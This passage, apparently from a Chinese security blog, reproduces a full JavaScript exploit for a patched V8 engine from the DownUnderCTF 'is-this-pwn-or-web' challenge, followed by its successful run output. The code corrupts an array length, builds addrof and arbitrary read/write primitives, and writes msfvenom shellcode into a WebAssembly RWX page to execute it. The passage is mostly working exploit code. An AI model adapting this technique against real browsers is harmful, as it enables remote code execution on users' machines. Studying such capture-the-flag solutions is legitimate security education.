 * https://blog.hexrabbit.io/2020/03/16/chromatic-aberration-writeup/ (use google translate)
 * https://halbecaf.com/2017/05/24/exploiting-a-v8-oob-write/ (very old)
 *
 * If you still have questions regarding this challenge, feel free to DM me 
 * anywhere. I'll do my best to respond to queries!
 *
 * Discord: Faith#2563
 * Twitter: @farazsth98
 */</span>

<span class="token comment" spellcheck="true">// Helper functions setup to convert between doubles and numbers when needed</span>
<span class="token keyword">var</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> f64_buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> u32_buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">ftoi</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// typeof(val) == float</span>
    f64_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">BigInt</span><span class="token punctuation">(</span>u32_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token function">BigInt</span><span class="token punctuation">(</span>u32_buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> 32n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Watch for little endianness</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">itof</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// typeof(val) == BigInt</span>
    u32_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span>val <span class="token operator">&amp;</span> 0xffffffffn<span class="token punctuation">)</span><span class="token punctuation">;</span>
    u32_buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span>val <span class="token operator">></span><span class="token operator">></span> 32n<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> f64_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">hex</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// typeof(val) == BigInt</span>
    <span class="token keyword">return</span> <span class="token string">"0x"</span> <span class="token operator">+</span> val<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">// We set up a web assembly page. This is mapped as an RWX page that we will</span>
<span class="token comment" spellcheck="true">// later write shellcode into.</span>
<span class="token keyword">var</span> wasm_code <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">133</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">131</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">129</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">145</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">138</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> wasm_mod <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Module</span><span class="token punctuation">(</span>wasm_code<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> wasm_instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Instance</span><span class="token punctuation">(</span>wasm_mod<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> f <span class="token operator">=</span> wasm_instance<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>main<span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[+] WebAssembly RWX page setup!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// Next, set up three arrays. These will be allocated one after another because</span>
<span class="token comment" spellcheck="true">// of the deterministic nature of the V8 heap. We corrupt the float array.</span>
<span class="token comment" spellcheck="true">// You can find their offsets relative to each other using GDB.</span>
<span class="token comment" spellcheck="true">//</span>
<span class="token comment" spellcheck="true">// While we do this, we also trigger the vulnerability to get a corrupted</span>
<span class="token comment" spellcheck="true">// float array in `float_arr`</span>
<span class="token keyword">var</span> float_arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
float_arr <span class="token operator">=</span> float_arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Trigger the vuln</span>
<span class="token keyword">var</span> addrof_arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Used for the addrof primitive later</span>
<span class="token keyword">var</span> arb_read_arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Used for the arbitrary read primitive later</span>

<span class="token comment" spellcheck="true">// We set up an ArrayBuffer and a DataView. We will use these later to write </span>
<span class="token comment" spellcheck="true">// our shellcode into the RWX page.</span>
<span class="token keyword">var</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> dataview <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[+] Corrupting float_arr's length to 2048"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// We need to store the current `elements` ptr before we corrupt the length</span>
<span class="token comment" spellcheck="true">// because corrupting the length also requires us to corrupt the `elements` ptr</span>
<span class="token comment" spellcheck="true">// in the process</span>
<span class="token keyword">var</span> float_arr_elem <span class="token operator">=</span> <span class="token function">ftoi</span><span class="token punctuation">(</span>float_arr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> 0xffffffffn<span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// Corrupt the length and keep the `elements` ptr intact</span>
float_arr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">itof</span><span class="token punctuation">(</span><span class="token punctuation">(</span>0x1000n <span class="token operator">&lt;</span><span class="token operator">&lt;</span> 32n<span class="token punctuation">)</span> <span class="token operator">+</span> float_arr_elem<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>float_arr<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">2048</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[+] Corruption successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[!] Corruption failed. Try again."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">throw</span> error<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">// Setup addrof primitive</span>
<span class="token comment" spellcheck="true">// Bottom 32 bits of float_arr[4] corresponds to addrof_arr[0]</span>
<span class="token comment" spellcheck="true">// We simply set addrof_arr[0] to the object whose address we want to leak</span>
<span class="token comment" spellcheck="true">// Then we read from float_arr[4]</span>
<span class="token keyword">function</span> <span class="token function">addrof</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    addrof_arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> obj<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">ftoi</span><span class="token punctuation">(</span>float_arr<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> 0xffffffffn<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[+] Addrof primitive has been setup"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// Setup an arbitrary read primitive for the V8 compressed heap</span>
<span class="token comment" spellcheck="true">// We do this by overwriting the elements pointer of our arb_read_arr to a</span>
<span class="token comment" spellcheck="true">// chosen address - 8 (making sure to keep the length set to 0x1000). We</span>
<span class="token comment" spellcheck="true">// subtract 8 because for any float array, arr[0] == (*elements_ptr + 8).</span>
<span class="token comment" spellcheck="true">// The elements pointer of arb_read_arr is at float_arr[17], offset found</span>
<span class="token comment" spellcheck="true">// through GDB.</span>
<span class="token comment" spellcheck="true">// addr must be a 32-bit value here</span>
<span class="token keyword">function</span> <span class="token function">compressed_arb_read</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    float_arr<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">itof</span><span class="token punctuation">(</span><span class="token punctuation">(</span>0x1000n <span class="token operator">&lt;</span><span class="token operator">&lt;</span> 32n<span class="token punctuation">)</span> <span class="token operator">+</span> addr <span class="token operator">-</span> 8n<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">ftoi</span><span class="token punctuation">(</span>arb_read_arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[+] Arbitrary read primitive for the compressed heap has been setup"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// Setup a function that writes our shellcode to a given address</span>
<span class="token comment" spellcheck="true">// We do this by overwriting the backing store address of the ArrayBuffer we</span>
<span class="token comment" spellcheck="true">// previously allocated to our chosen address. We then use the DataView that we</span>
<span class="token comment" spellcheck="true">// also allocated to write our shellcode to that address space.</span>
<span class="token comment" spellcheck="true">//</span>
<span class="token comment" spellcheck="true">// Using GDB, we find that the backing store address of our ArrayBuffer is</span>
<span class="token comment" spellcheck="true">// misaligned at float_arr[20] and float_arr[21]. The misalignment is as</span>
<span class="token comment" spellcheck="true">// follows:</span>
<span class="token comment" spellcheck="true">//</span>
<span class="token comment" spellcheck="true">// * The upper 32-bits of float_arr[20] correspond to the lower 32 bits of</span>
<span class="token comment" spellcheck="true">//   the backing store address</span>
<span class="token comment" spellcheck="true">// * The lower 32-bits of float_arr[21] correspond to the upper 32 bits of</span>
<span class="token comment" spellcheck="true">//   the backing store address</span>
<span class="token comment" spellcheck="true">//</span>
<span class="token comment" spellcheck="true">// If this is confusing to you, that's because it is very confusing :p I would</span>
<span class="token comment" spellcheck="true">// suggest looking at this in GDB and comparing whatever I mentioned above to</span>
<span class="token comment" spellcheck="true">// what you see in GDB until it makes sense</span>
<span class="token comment" spellcheck="true">//</span>
<span class="token comment" spellcheck="true">// addr must be a 64-bit value here</span>
<span class="token keyword">function</span> <span class="token function">copy_shellcode</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// The backing store address of buf is not aligned to 64 bytes, so we have</span>
    <span class="token comment" spellcheck="true">// to write the upper 32-bits and the lower 32-bits of our address to two</span>
    <span class="token comment" spellcheck="true">// separate indices like this</span>
    float_arr<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">itof</span><span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">&amp;</span> 0xffffffffn<span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> 32n<span class="token punctuation">)</span><span class="token punctuation">;</span>
    float_arr<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">itof</span><span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">&amp;</span> 0xffffffff00000000n<span class="token punctuation">)</span> <span class="token operator">></span><span class="token operator">></span> 32n<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> shellcode<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        dataview<span class="token punctuation">.</span><span class="token function">setUint32</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span>i<span class="token punctuation">,</span> shellcode<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">// msfvenom -p linux/x64/exec CMD='./flagprinter' --format dword</span>
<span class="token keyword">var</span> shellcode <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x99583b6a</span><span class="token punctuation">,</span> <span class="token number">0x622fbb48</span><span class="token punctuation">,</span> <span class="token number">0x732f6e69</span><span class="token punctuation">,</span> <span class="token number">0x48530068</span><span class="token punctuation">,</span> <span class="token number">0x2d68e789</span><span class="token punctuation">,</span> <span class="token number">0x48000063</span><span class="token punctuation">,</span> <span class="token number">0xe852e689</span><span class="token punctuation">,</span> <span class="token number">0x0000000e</span><span class="token punctuation">,</span> 
<span class="token number">0x6c662f2e</span><span class="token punctuation">,</span> <span class="token number">0x72706761</span><span class="token punctuation">,</span> <span class="token number">0x65746e69</span><span class="token punctuation">,</span> <span class="token number">0x57560072</span><span class="token punctuation">,</span> <span class="token number">0x0fe68948</span><span class="token punctuation">,</span> <span class="token number">0x00000005</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// Now, we leak the address of our RWX page</span>
<span class="token comment" spellcheck="true">// Using GDB, we know this address is at *(&amp;wasm_instance + 0x68)</span>
<span class="token keyword">var</span> rwx_page_addr <span class="token operator">=</span> <span class="token function">compressed_arb_read</span><span class="token punctuation">(</span><span class="token function">addrof</span><span class="token punctuation">(</span>wasm_instance<span class="token punctuation">)</span> <span class="token operator">+</span> 0x68n<span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[+] RWX page address found: "</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>rwx_page_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// Finally, we copy our shellcode to the RWX page and call the WASM function to</span>
<span class="token comment" spellcheck="true">// execute it.</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[+] Copying ./flagprinter shellcode to RWX page"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">copy_shellcode</span><span class="token punctuation">(</span>rwx_page_addr<span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[+] Printing flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<pre><code>./d8 --shell ./exploit.js                                                   ✔  00:49:32 
[+] WebAssembly RWX page setup!
[+] Corrupting float_arr&#39;s length to 2048
[+] Corruption successful!
[+] Addrof primitive has been setup
[+] Arbitrary read primitive for the compressed heap has been setup
[+] RWX page address found: 0xaf5c5019000
[+] Copying ./flagprinter shellcode to RWX page
[+] Printing flag!
DUCTF&#123;y0u_4r3_a_futUR3_br0ws3r_pwn_pr0d1gy!!&#125;</code></pre>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">i0gan</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://i0gan.pwnsky.com/2021/03/30/v8-01/">http://i0gan.pwnsky.com/2021/03/30/v8-01/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/v8/">v8</a></div><div class="post_share"><div class="social-share" data-image="/img/text_bg.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/03/31/fuzz-afl/"><img class="prev-cover" src="/img/text_bg.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Binary fuzzing way of american fuzzy lop</div></div></a></div><div class="next-post pull-right"><a href="/2021/03/26/buu-pwn/"><img class="next-cover" src="/img/text_bg.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">BUU PWN</div></div></a></div></nav></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/header.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">i0gan</div><div class="author-info__description">起床时想到你的微笑，洗脸时嗅到你的味道，上床前你是我的需要，真的不能离开你-我亲爱的马桶！</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">68</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">30</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">24</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/i0gan"><i class="fab fa-github"></i><span>Follow Me</span></a></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#V8%E5%88%9D%E6%8E%A2"><span class="toc-number">1.</span> <span class="toc-text">V8初探</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E8%AF%91-v8"><span class="toc-number">1.2.</span> <span class="toc-text">编译 v8</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91debug%E7%89%88"><span class="toc-number">1.2.1.</span> <span class="toc-text">编译debug版</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91release%E7%89%88"><span class="toc-number">1.2.2.</span> <span class="toc-text">编译release版</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Patch%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.</span> <span class="toc-text">Patch文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E6%9C%AB%E5%B0%BE%E5%82%A8%E5%AD%98%E7%9A%84%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">1.4.</span> <span class="toc-text">数组末尾储存的是什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Downunder-ctf-is-this-pwn-or-web"><span class="toc-number">1.5.</span> <span class="toc-text">Downunder ctf [is-this-pwn-or-web]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.5.1.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/07/13/leetcode-3-two-sum/" title="Leet Code-3. Longest Substring Without Repeating Characters"><img src="/img/text_bg.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Leet Code-3. Longest Substring Without Repeating Characters"/></a><div class="content"><a class="title" href="/2021/07/13/leetcode-3-two-sum/" title="Leet Code-3. Longest Substring Without Repeating Characters">Leet Code-3. Longest Substring Without Repeating Characters</a><time datetime="2021-07-13T03:06:00.000Z" title="Created 2021-07-13 11:06:00">2021-07-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/13/leetcode-2-add-two-numbers/" title="Leet Code-2. Add Two Numbers"><img src="/img/text_bg.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Leet Code-2. Add Two Numbers"/></a><div class="content"><a class="title" href="/2021/07/13/leetcode-2-add-two-numbers/" title="Leet Code-2. Add Two Numbers">Leet Code-2. Add Two Numbers</a><time datetime="2021-07-13T01:14:00.000Z" title="Created 2021-07-13 09:14:00">2021-07-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/13/leetcode-1-two-sum/" title="Leet Code-1. Two Sum"><img src="/img/text_bg.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Leet Code-1. Two Sum"/></a><div class="content"><a class="title" href="/2021/07/13/leetcode-1-two-sum/" title="Leet Code-1. Two Sum">Leet Code-1. Two Sum</a><time datetime="2021-07-13T00:07:00.000Z" title="Created 2021-07-13 08:07:00">2021-07-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/05/gsky-2/" title="Gsky游戏服务器框架介绍 2"><img src="/img/text_bg.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Gsky游戏服务器框架介绍 2"/></a><div class="content"><a class="title" href="/2021/07/05/gsky-2/" title="Gsky游戏服务器框架介绍 2">Gsky游戏服务器框架介绍 2</a><time datetime="2021-07-05T04:00:00.000Z" title="Created 2021-07-05 12:00:00">2021-07-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/02/des/" title="DES加解密-简单原理与go语言实现"><img src="/img/text_bg.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DES加解密-简单原理与go语言实现"/></a><div class="content"><a class="title" href="/2021/07/02/des/" title="DES加解密-简单原理与go语言实现">DES加解密-简单原理与go语言实现</a><time datetime="2021-07-02T04:00:00.000Z" title="Created 2021-07-02 12:00:00">2021-07-02</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/text_bg.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By i0gan</div><div class="framework-info"></div><div class="icp"><a target="_blank" rel="noopener" href="http://www.beian.gov.cn/"><img class="icp-icon" src="/img/icp.png" alt="ICP"/><span>黔ICP备20006037号</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script 